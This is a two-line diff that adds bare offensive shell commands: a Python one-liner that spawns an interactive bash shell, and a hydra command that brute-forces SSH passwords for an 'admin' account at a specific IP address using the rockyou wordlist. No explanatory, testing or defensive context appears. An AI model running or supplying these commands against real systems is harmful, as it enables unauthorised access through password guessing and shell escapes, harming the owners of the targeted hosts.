@@ -1,0 +1,2 @@
+python -c 'import os; os.system("/bin/bash")'
+hydra -l admin -P rockyou.txt 253.86.196.54 ssh
